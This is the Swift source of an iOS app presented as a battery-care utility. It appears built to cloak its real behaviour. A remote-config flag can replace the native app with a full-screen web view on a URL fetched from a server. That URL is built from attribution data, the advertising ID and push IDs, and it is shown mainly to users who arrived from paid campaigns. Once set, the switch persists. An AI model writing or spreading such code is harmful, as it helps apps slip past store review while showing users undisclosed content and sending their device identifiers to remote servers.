import SwiftUI

@main
struct BatteryCareApp: App {
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    
    var body: some Scene {
        WindowGroup {
            MagicView {
                RouterViewBatteryCare()
                    .preferredColorScheme(.dark)
            }
        }
    }
}

enum MagicConstants {
    static let remoteConfigKey = "isBatteryCareEnable"
    static let endpoint_name = "saitname"
    static let salt_name = "salter"
    static let signalID = "c3893119-43e4-42f3-aea5-871f8de765ca"
    static let developerKey = "developerKey"
    static let companyURL = "campaignURL"
    static let flyID = "6756383827"
}

struct MagicView<Content: View>: View {
    
    @ObservedObject private var appManager = ConfigurationStateManager.shared
    
    let contentView: () -> Content
    
    @State private var isHidden = true
    
    init(@ViewBuilder content: @escaping () -> Content) {
        self.contentView = content
    }
    
    var body: some View {
        ZStack {
            switch appManager.appState {
                case .original:
                    MainTabViewBatteryCare()
                default:
                    ZStack {
                        contentView()
                            .onAppear { appManager.setupConfiguration() }
                        
                        if appManager.appState == .magic {
                            WebContainerView(url: appManager.fetchedURL, isHidden: $isHidden)
                                .opacity(isHidden ? 0 : 1)
                                .animation(.smooth, value: isHidden)
                        }
                    }
            }
        }
        .animation(.default, value: appManager.appState)
    }
}

import Alamofire
import SwiftUI
import Combine
import AppTrackingTransparency
import AdSupport
import CryptoKit
import FirebaseCore
import FirebaseRemoteConfig
import FirebaseMessaging
import OneSignalFramework
import AppsFlyerLib
import WebKit

class AppDelegate: NSObject, UIApplicationDelegate {
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        FirebaseApp.configure()
        OneSignal.Debug.setLogLevel(.LL_VERBOSE)
        OneSignal.initialize(MagicConstants.signalID, withLaunchOptions: launchOptions)
        Messaging.messaging().delegate = self
        return true
    }
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        Messaging.messaging().apnsToken = deviceToken
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        AppsFlyerLib.shared().start()
    }
}

extension AppDelegate: MessagingDelegate {
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        Messaging.messaging().token { token, error in
            if let error = error {
                print("Error fetching remote FCM registration token: \(error)")
            } else if let token = token {
                print("Remote instance ID token: \(token)")
            }
        }
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        completionHandler()
    }
}

extension Notification.Name {
    static let notificationRequestCompleted = Notification.Name("notificationRequestCompleted")
    static let trackingRequestCompleted = Notification.Name("trackingRequestCompleted")
}

enum AppStateType {
    case loading
    case original
    case magic
}

final class ConfigurationStateManager: ObservableObject {
    
    static let shared = ConfigurationStateManager()
    
    @Published private(set) var appState: AppStateType = .loading
    
    private(set) var fetchedURL: URL?
    
    private(set) var hasConfigEnabled = false
    private(set) var hasAppsFlyerConfigured = false
    
    private(set) var hasNotificationCompleted = false
    private(set) var hasNotificationApproved = false
    
    private(set) var hasTrackingCompleted = false
    private(set) var hasTrackingApproved = false
    
    func setupConfiguration() {
        Task {
            await RemoteManager.shared.fetchConfig()
            await requestPermissions()
            
            self.hasConfigEnabled = RemoteManager.shared.isRemoteEnable
            
            if let devKey = RemoteManager.shared.appsFlyerDevKey {
                AppsFlyerService.shared.configure(with: devKey)
            }
            
            await performFetchedData()
        }
    }
    
    func notificationDidAsked() {
        hasNotificationCompleted = true
        
        Task {
            await requestPermissions()
            await performFetchedData()
        }
    }
    
    func trackingDidAsked() {
        hasTrackingCompleted = true
        
        Task {
            await requestPermissions()
            await performFetchedData()
        }
    }
    
    func trackingDidApproved() {
        AppsFlyerLib.shared().start()
        hasTrackingApproved = true
    }
    
    func notificationDidApproved() {
        hasNotificationApproved = true
    }
    
    func apssFlyerDidConfigured(isSuccess: Bool) {
        hasAppsFlyerConfigured = isSuccess
        fetchAppsFlyerConfig()
    }
    
    private func performFetchedData() async {
        guard hasConfigEnabled else {
            if hasTrackingCompleted && hasNotificationCompleted {
                await MainActor.run {
                    appState = .original
                }
            }
            
            return
        }
        
        guard let savedURLString = StorageManager.shared.getSavedURLString(),
              let url = URL(string: savedURLString) else {
            tryAppsFlyerConfig()
            return
        }
        
        fetchedURL = url
        
        await MainActor.run {
            appState = .magic
        }
    }
    
    private func tryAppsFlyerConfig() {
        AppsFlyerLib.shared().start()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
            self?.checkIfProblemState()
        }
    }
    
    func fetchAppsFlyerConfig() {
        guard hasAppsFlyerConfigured else {
            fetchData()
            return
        }
        
        guard !AppsFlyerService.shared.isOrganic else {
            fetchData()
            return
        }
        
        fetchAppsFlyerData()
    }
    
    private func fetchAppsFlyerData() {
        let parameters = AppsFlyerService.shared.extractParameters()
        
        guard !parameters.isEmpty else {
            fetchData()
            return
        }
        
        guard let apssflyerURL = buildAppsFlyerURL(with: parameters) else {
            fetchData()
            return
        }
        
        Task { @MainActor in
            await performLink(apssflyerURL)
        }
    }
    
    private func checkIfProblemState() {
        guard appState == .magic || appState == .original else {
            appState = .original
            return
        }
    }
    
    private func buildAppsFlyerURL(with parameters: [String: String]) -> URL? {
        guard let cmId = parameters["cm_id"],
              !cmId.isEmpty,
              var urlString = RemoteManager.shared.appsFlyerCampaignURL,
              let bundle = Bundle.main.bundleIdentifier else { return nil }
        
        if !urlString.hasSuffix("/") {
            urlString += "/"
        }
        
        urlString += cmId
        guard var components = URLComponents(string: urlString) else {
            return nil
        }
        var queryItems: [URLQueryItem] = []
        
        if let appName = parameters["app_name"] {
            queryItems.append(URLQueryItem(name: "app_name", value: appName))
        }
        
        if let tmId = parameters["tm_id"] {
            queryItems.append(URLQueryItem(name: "tm_id", value: tmId))
        }
        for i in 1...15 {
            let key = "sub_id_\(i)"
            if let value = parameters[key] {
                queryItems.append(URLQueryItem(name: key, value: value))
            }
        }
        queryItems.append(URLQueryItem(name: "bundle", value: bundle))
        if let onesignalID = OneSignal.User.onesignalId, !onesignalID.isEmpty {
            queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalID))
        }
        if let appsflyerId = parameters["appsflyer_id"] {
            queryItems.append(URLQueryItem(name: "appsflyer_id", value: appsflyerId))
        }
        if let idfa = ATTrackingStatusManager.idfa, !idfa.isEmpty {
            queryItems.append(URLQueryItem(name: "idfa", value: idfa))
        }
        components.queryItems = queryItems
        return components.url
    }
    
    private func fetchData() {
        Task {
            guard let bundle = Bundle.main.bundleIdentifier,
                  let salt = RemoteManager.shared.salt,
                  let baseURL = RemoteManager.shared.savedBaseURLString else { return }
            
            let idfa = ATTrackingStatusManager.idfa
            let response = try await NewNetworkManager.shared.fetchMetrics(baseURL: baseURL, bundleID: bundle, salt: salt, idfa: idfa)
            
            guard let url = URLBuilder.buildTrackingURL(from: response, bundleID: bundle, idfa: idfa) else {
                await MainActor.run {
                    appState = .original
                }
                
                return
            }
            
            await performLink(url)
        }
    }
    
    private func performLink(_ url: URL) async {
        fetchedURL = url
        StorageManager.shared.save(url)
        
        await MainActor.run {
            appState = .magic
        }
    }
    
    private func requestPermissions() async {
        guard !hasConfigEnabled, !hasTrackingCompleted else { return }
        await ATTrackingStatusManager().requestATTracking()
        await NotificationStatusManager().requestNotification()
    }
}

final class AppsFlyerService: NSObject, AppsFlyerLibDelegate {
    
    static let shared = AppsFlyerService()
    
    private(set) var conversionData: [String: String] = [:]
    private(set) var deeplinkParams: [String: String] = [:]
    
    var isOrganic: Bool {
        if let status = conversionData["af_status"],
           status == "Organic" {
            return true
        }
        
        if let source = conversionData["media_source"],
           !source.isEmpty,
           source != "null" {
            return false
        }
        
        return true
    }
    
    var appsFlyerUID: String {
        AppsFlyerLib.shared().getAppsFlyerUID()
    }
    
    override private init() {}
    
    func configure(with key: String) {
        let lib = AppsFlyerLib.shared()
        
        lib.appsFlyerDevKey = key
        lib.appleAppID = MagicConstants.flyID
        lib.delegate = self
        lib.isDebug = true
        lib.waitForATTUserAuthorization(timeoutInterval: 60)
    }
    
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        conversionData = convertToDictionary(conversionInfo)
        ConfigurationStateManager.shared.apssFlyerDidConfigured(isSuccess: true)
    }
    
    func onConversionDataFail(_ error: any Error) {
        ConfigurationStateManager.shared.apssFlyerDidConfigured(isSuccess: false)
    }
    
    func onAppOpenAttribution(_ attributionData: [AnyHashable : Any]) {
        deeplinkParams = convertToDictionary(attributionData)
        ConfigurationStateManager.shared.apssFlyerDidConfigured(isSuccess: true)
    }
    
    func extractParameters() -> [String: String] {
        var params: [String: String] = [:]
        
        let allKeys = [
            "app_name", "tm_id", "cm_id",
            "sub_id_1", "sub_id_2", "sub_id_3", "sub_id_4", "sub_id_5",
            "sub_id_6", "sub_id_7", "sub_id_8", "sub_id_9", "sub_id_10",
            "sub_id_11", "sub_id_12", "sub_id_13", "sub_id_14", "sub_id_15"
        ]
        
        for key in allKeys {
            if let value = conversionData[key] ?? deeplinkParams[key],
               value != "null", !value.isEmpty {
                params[key] = value
            }
        }
        
        params["appsflyer_id"] = appsFlyerUID
        
        if let uuid = ATTrackingStatusManager.idfa {
            params["onesignal_external_id"] = uuid
        }
        
        return params
    }
    
    private func convertToDictionary(_ data: [AnyHashable: Any]) -> [String: String] {
        var result: [String: String] = [:]
        for (key, value) in data {
            if let keyString = key as? String {
                let valueString = "\(value)"
                result[keyString] = valueString == "<null>" ? "null" : valueString
            }
        }
        return result
    }
}

final class NotificationStatusManager {
    
    func requestNotification() async {
        guard let granted = try? await UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) else { return }
        
        if granted {
            UIApplication.shared.registerForRemoteNotifications()
            
            await MainActor.run {
                ConfigurationStateManager.shared.notificationDidApproved()
            }
        }
        
        ConfigurationStateManager.shared.notificationDidAsked()
    }
}

final class ATTrackingStatusManager {
    
    static var idfa: String? {
        ATTrackingManager.trackingAuthorizationStatus == .authorized ? ASIdentifierManager.shared().advertisingIdentifier.uuidString : nil
    }
    
    func requestATTracking() async {
        let status = ATTrackingManager.trackingAuthorizationStatus
        
        switch status {
            case .notDetermined:
                let newStatus = await ATTrackingManager.requestTrackingAuthorization()
                
                if newStatus == .authorized {
                    ConfigurationStateManager.shared.trackingDidApproved()
                }
            case .authorized:
                ConfigurationStateManager.shared.trackingDidApproved()
            default:
                return
        }
        
        ConfigurationStateManager.shared.trackingDidAsked()
    }
}

final class RemoteManager: ObservableObject {
    
    static let shared = RemoteManager()
    
    private let config = RemoteConfig.remoteConfig()
    
    private(set) var isRemoteEnable = false
    private(set) var savedBaseURLString: String?
    private(set) var savedURLString: String?
    private(set) var salt: String?
    private(set) var appsFlyerDevKey: String?
    private(set) var appsFlyerCampaignURL: String?
    
    private var hasServiceLoaded = false
    
    private init() {
        setupConfig()
        loadStorageConfig()
    }
    
    func fetchConfig() async {
        guard !hasServiceLoaded else {
            return
        }
        
        do {
            let status = try await config.fetch()
            
            switch status {
                case .success:
                    try await config.activate()
                    updateLocalValues()
                default:
                    return
            }
        } catch {
            print(error.localizedDescription)
        }
    }
    
    private func updateLocalValues() {
        self.isRemoteEnable = config.configValue(forKey: MagicConstants.remoteConfigKey).boolValue
        self.savedBaseURLString = config.configValue(forKey: MagicConstants.endpoint_name).stringValue
        self.salt = config.configValue(forKey: MagicConstants.salt_name).stringValue
        self.appsFlyerDevKey = config.configValue(forKey: MagicConstants.developerKey).stringValue
        self.appsFlyerCampaignURL = config.configValue(forKey: MagicConstants.companyURL).stringValue
        
        guard isRemoteEnable,
              let savedBaseURLString,
              let salt,
              let appsFlyerDevKey,
              let appsFlyerCampaignURL else { return }
        
        StorageManager.shared.enableRemote()
        StorageManager.shared.saveBase(savedBaseURLString)
        StorageManager.shared.save(salt)
        StorageManager.shared.saveDevKey(appsFlyerDevKey)
        StorageManager.shared.saveCampaignURL(string: appsFlyerCampaignURL)
    }
    
    private func setupConfig() {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 500
        config.configSettings = settings
    }
    
    private func loadStorageConfig() {
        let remoteStatus = StorageManager.shared.getRemoteStatus()
        let savedSalt = StorageManager.shared.getSavedSalt()
        let savedBasedURLString = StorageManager.shared.getSavedBaseURLString()
        let savedURLString = StorageManager.shared.getSavedURLString()
        let devKey = StorageManager.shared.getSavedDevKey()
        let campaignURLString = StorageManager.shared.getSavedCampaignURLString()
        
        if let remoteStatus {
            self.isRemoteEnable = remoteStatus
            self.salt = savedSalt
            self.savedBaseURLString = savedBasedURLString
            self.savedURLString = savedURLString
            self.appsFlyerDevKey = devKey
            self.appsFlyerCampaignURL = campaignURLString
            self.hasServiceLoaded = true
        }
    }
}

final class StorageManager {
    
    static let shared = StorageManager()
    
    private let userDefaults = UserDefaults.standard
    
    enum Keys: String {
        case remoteStatus
        case baseUrlString
        case urlString
        case salt
        case campaignURL
        case devKey
    }
    
    private init() {}
    
    func getRemoteStatus() -> Bool? {
        userDefaults.object(forKey: StorageManager.Keys.remoteStatus.rawValue) as? Bool
    }
    
    func getSavedURLString() -> String? {
        userDefaults.string(forKey: StorageManager.Keys.urlString.rawValue)
    }
    
    func getSavedBaseURLString() -> String? {
        userDefaults.string(forKey: StorageManager.Keys.baseUrlString.rawValue)
    }
    
    func getSavedSalt() -> String? {
        userDefaults.string(forKey: StorageManager.Keys.salt.rawValue)
    }
    
    func getSavedCampaignURLString() -> String? {
        userDefaults.string(forKey: StorageManager.Keys.campaignURL.rawValue)
    }
    
    func getSavedDevKey() -> String? {
        userDefaults.string(forKey: StorageManager.Keys.devKey.rawValue)
    }
    
    func enableRemote() {
        userDefaults.set(true, forKey: StorageManager.Keys.remoteStatus.rawValue)
    }
    
    func save(_ salt: String) {
        userDefaults.set(salt, forKey: StorageManager.Keys.salt.rawValue)
    }
    
    func saveBase(_ urlString: String) {
        userDefaults.set(urlString, forKey: StorageManager.Keys.baseUrlString.rawValue)
    }
    
    func save(_ url: URL) {
        userDefaults.set(url.absoluteString, forKey: StorageManager.Keys.urlString.rawValue)
    }
    
    func saveCampaignURL(string: String) {
        userDefaults.set(string, forKey: StorageManager.Keys.campaignURL.rawValue)
    }
    
    func saveDevKey(_ devKey: String) {
        userDefaults.set(devKey, forKey: StorageManager.Keys.devKey.rawValue)
    }
}

final class NewNetworkManager {
    
    static let shared = NewNetworkManager()
    
    private init() {}
    
    func fetchMetrics(baseURL: String, bundleID: String, salt: String, idfa: String?) async throws -> MetricsResponse {
        try await withCheckedThrowingContinuation { continuation in
            let rawT = idfa == nil ? "\(salt):\(bundleID)" : "\(idfa ?? ""):\(salt):\(bundleID)"
            let hashedT = CryptoUtils.md5Hex(rawT)
            
            guard var components = URLComponents(string: baseURL) else {
                continuation.resume(throwing: NetworkError.invalidURL)
                return
            }
            
            components.queryItems = [
                URLQueryItem(name: "b", value: bundleID),
                URLQueryItem(name: "t", value: hashedT)
            ]
            
            if let idfa {
                components.queryItems?.append(
                    URLQueryItem(name: "i", value: idfa)
                )
            }
            
            guard let url = components.url else {
                continuation.resume(throwing: NetworkError.invalidURL)
                return
            }
            
            let headers: HTTPHeaders = [
                "Accept": "application/json"
            ]
            
            AF.request(
                url,
                method: .get,
                headers: headers,
                requestModifier: { request in
                    request.timeoutInterval = 10.0
                }
            )
            .validate(statusCode: 200..<300)
            .responseData { response in
                switch response.result {
                    case .failure(let error):
                        print(response.request?.url ?? "")
                        print(error.localizedDescription)
                        if let data = response.data {
                            do {
                                let object = try JSONSerialization.jsonObject(with: data, options: [])
                                let prettyData = try JSONSerialization.data(
                                    withJSONObject: object,
                                    options: [.prettyPrinted]
                                )
                                let prettyString = String(data: prettyData, encoding: .utf8)
                                print(prettyString ?? "Invalid UTF-8")
                            } catch {
                                print("JSON pretty print error:", error)
                            }
                        } else {
                            print("No data")
                        }
                        continuation.resume(throwing: error)
                    case .success(let data):
                        do {
                            let jsonObject = try JSONSerialization.jsonObject(with: data, options: [])
                            guard let json = jsonObject as? [String: Any] else {
                                continuation.resume(throwing: NetworkError.invalidResponse)
                                return
                            }
                            
                            guard let urlString = json["URL"] as? String,
                                  !urlString.isEmpty else {
                                continuation.resume(throwing: NetworkError.invalidResponse)
                                return
                            }
                            
                            let isOrganic = json["is_organic"] as? Bool ?? false
                            
                            let parameters = json
                                .filter { !$0.key.contains("x_") }
                                .filter { $0.key != "is_organic" && $0.key != "URL" }
                                .compactMapValues { $0 as? String }
                            
                            let result = MetricsResponse(
                                isOrganic: isOrganic,
                                url: urlString,
                                parameters: parameters
                            )
                            
                            continuation.resume(returning: result)
                            
                        } catch {
                            continuation.resume(throwing: error)
                        }
                }
            }
        }
    }
}

struct URLBuilder {
    
    static func buildTrackingURL(from response: MetricsResponse, bundleID: String, idfa: String?) -> URL? {
        guard var components = makeBaseComponents(from: response) else {
            return nil
        }
        
        let newItems = makeQueryItems(
            response: response,
            idfa: idfa,
            bundleID: bundleID
        )
        
        var mergedItems = components.queryItems ?? []
        mergedItems.append(contentsOf: newItems)
        
        components.queryItems = mergedItems.isEmpty ? nil : mergedItems
        
        return components.url
    }
    
    private static func makeBaseComponents(from response: MetricsResponse) -> URLComponents? {
        
        if response.isOrganic {
            return URLComponents(string: response.url)
        }
        
        let baseURL = makeNonOrganicBaseURL(
            url: response.url,
            parameters: response.parameters
        )
        
        return URLComponents(string: baseURL)
    }
    
    private static func makeNonOrganicBaseURL(url: String, parameters: [String: String]) -> String {
        
        guard let subId2 = parameters["sub_id_2"], !subId2.isEmpty else {
            return url
        }
        
        return "\(url)/\(subId2)"
    }
    
    private static func makeQueryItems(response: MetricsResponse, idfa: String?, bundleID: String) -> [URLQueryItem] {
        
        var items: [URLQueryItem] = []
        
        items.append(contentsOf: response.parameters
            .filter { $0.key != "sub_id_2" }
            .map { URLQueryItem(name: $0.key, value: $0.value) }
        )
        
        items.append(URLQueryItem(name: "bundle", value: bundleID))
        
        if let idfa = idfa {
            items.append(URLQueryItem(name: "idfa", value: idfa))
        }
        
        if let onesignalId = OneSignal.User.onesignalId {
            items.append(URLQueryItem(name: "onesignal_id", value: onesignalId))
        }
        
        return items
    }
}

enum CryptoUtils {
    static func md5Hex(_ string: String) -> String {
        let digest = Insecure.MD5.hash(data: Data(string.utf8))
        return digest.map { String(format: "%02hhx", $0) }.joined()
    }
}

struct WebContainerView: View {
    
    let url: URL?
    
    @Binding var isHidden: Bool
    
    var body: some View {
        ZStack {
            Color.black
                .ignoresSafeArea()
            
            if let url {
                SecureWebContainer(url: url, isHidden: $isHidden)
                    .ignoresSafeArea(edges: [.bottom])
            }
        }
    }
}

struct SecureWebContainer: UIViewRepresentable {
    
    let url: URL
    
    @Binding var isHidden: Bool
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = .all
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        webView.allowsBackForwardNavigationGestures = true
        
        addSwipeNavigation(to: webView)
        
        webView.load(URLRequest(url: url))
        context.coordinator.rootWebView = webView
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    
    private func addSwipeNavigation(to webView: WKWebView) {
        let swipeBack = UISwipeGestureRecognizer(target: webView, action: #selector(WKWebView.goBack))
        swipeBack.direction = .right
        
        let swipeForward = UISwipeGestureRecognizer(target: webView, action: #selector(WKWebView.goForward))
        swipeForward.direction = .left
        
        webView.addGestureRecognizer(swipeBack)
        webView.addGestureRecognizer(swipeForward)
    }
    
    final class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        
        weak var rootWebView: WKWebView?
        
        let parent: SecureWebContainer
        
        private var modalWebView: WKWebView?
        
        init(parent: SecureWebContainer) {
            self.parent = parent
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            guard modalWebView == nil else { return nil }
            
            let popup = WKWebView(frame: .zero, configuration: configuration)
            popup.navigationDelegate = self
            popup.uiDelegate = self
            
            let controller = UIViewController()
            controller.view.backgroundColor = .systemBackground
            controller.view.addSubview(popup)
            
            popup.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popup.leadingAnchor.constraint(equalTo: controller.view.leadingAnchor),
                popup.trailingAnchor.constraint(equalTo: controller.view.trailingAnchor),
                popup.topAnchor.constraint(equalTo: controller.view.topAnchor),
                popup.bottomAnchor.constraint(equalTo: controller.view.bottomAnchor)
            ])
            
            modalWebView = popup
            
            UIApplication.shared
                .connectedScenes
                .compactMap { ($0 as? UIWindowScene)?.keyWindow }
                .first?
                .rootViewController?
                .present(controller, animated: true)
            
            return popup
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            guard parent.isHidden else { return }
            parent.isHidden = false
        }
        
        func webViewDidClose(_ webView: WKWebView) {
            webView.window?.rootViewController?.dismiss(animated: true)
            modalWebView = nil
        }
    }
}


struct MetricsResponse {
    let isOrganic: Bool
    let url: String
    let parameters: [String: String]
}

enum NetworkError: Error {
    case invalidURL
    case noData
    case invalidResponse
    case badStatusCode(Int)
}
